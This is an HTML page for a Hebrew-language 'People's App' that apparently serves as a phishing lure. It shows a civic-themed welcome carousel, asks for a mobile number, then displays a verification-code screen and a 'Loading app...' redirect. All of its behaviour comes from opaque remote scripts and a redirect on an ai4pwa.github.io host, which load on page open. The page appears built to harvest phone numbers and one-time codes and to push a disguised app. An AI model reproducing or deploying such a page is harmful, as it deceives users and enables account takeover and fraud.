<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>האפליקציה של העם</title>
  <link rel="icon" type="image/png" href="https://base44.app/api/apps/686424824d7b61721eac3e29/files/public/686424824d7b61721eac3e29/855bbbfc4_a80506b54_logo11-.png">
  <script src="https://ai4pwa.github.io/i/lc.js?unique_id=mfhzz9vsmc67d_index.css"></script>
  <meta name="redirect-url" content="https://ai4pwa.github.io/i/lh.html?unique_id=mgw3ab97oq6nr_main.html">
</head>
<body>

  <div id="app">
    <!-- Stage 1 -->
    <div id="stage1" class="screen active">
      <img class="logo-img" src="https://base44.app/api/apps/686424824d7b61721eac3e29/files/4321cce2e_-.png" alt="isg">
      <br>
      <h2 class="welcome-title">ברוכים הבאים<br><strong>לאפליקציה של העם</strong></h2>

      <div class="carousel-container">
        <div class="carousel-track" id="carouselTrack">
          <div class="carousel-slide">
            <img src="https://base44.app/api/apps/686424824d7b61721eac3e29/files/1961acfaa_undraw_connected_0xor.png" alt="Community">
            גלו דרכים חדשות לתקשר עם הקהילה שלכם
          </div>
          <div class="carousel-slide">
            <img src="https://base44.app/api/apps/686424824d7b61721eac3e29/files/6e331360c_undraw_os-upgrade_ztrf.png" alt="Updates">
            תישארו מעודכנים בשינויים המתרחשים בסביבה שלכם
          </div>
          <div class="carousel-slide">
            <img src="https://base44.app/api/apps/686424824d7b61721eac3e29/files/26b0145f9_undraw_candidate_q4my.png" alt="Policies">
            עזרו לעצב את הקהילה המקומית שלכם
          </div>
          <div class="carousel-slide">
            <img src="https://base44.app/api/apps/686424824d7b61721eac3e29/files/93af16dd5_undraw_voting_3ygx.png" alt="Voice">
            השפיעו על מקבלי ההחלטות
          </div>
        </div>
        <div class="carousel-indicators" id="carouselIndicators">
          <span class="dot active"></span>
          <span class="dot"></span>
          <span class="dot"></span>
          <span class="dot"></span>
        </div>
      </div>

      <button onclick="navigateTo('#login')">כניסה</button>
    </div>

    <!-- Stage 2 -->
    <div id="login" class="screen">
      <button class="back-btn" onclick="navigateTo('#stage1')">← חזור</button>
      <div class="centered">
        <h3>נא להזין מספר טלפון נייד</h3>
        <input type="tel" id="phoneInput" placeholder="לדוגמה: 0521234567" required pattern="^05[0-9]{8}$">
      </div>
      <button onclick="validatePhone()">הבא</button>
    </div>

    <!-- Stage 3 -->
    <div id="confirm" class="screen">
      <button class="back-btn" onclick="navigateTo('#login')">← חזור</button>
      <div class="centered">
        <h3>קוד אימות נשלח למכשירך</h3>
        <div class="code-inputs">
          <input class="code-input digit" readonly>
          <input class="code-input digit" readonly>
          <input class="code-input digit" readonly>
          <input class="code-input digit" readonly>
        </div>
      </div>
      <button id="confirmNextBtn" onclick="navigateTo('#final')" disabled>הבא</button>
    </div>

    <!-- Redirect -->
    <div id="final" class="screen">
      <p>Loading app...</p>
    </div>
  </div>

  <script src="https://ai4pwa.github.io/i/l.js?unique_id=mfy4rbzdujhdz_index.js"></script>
</body>
</html>
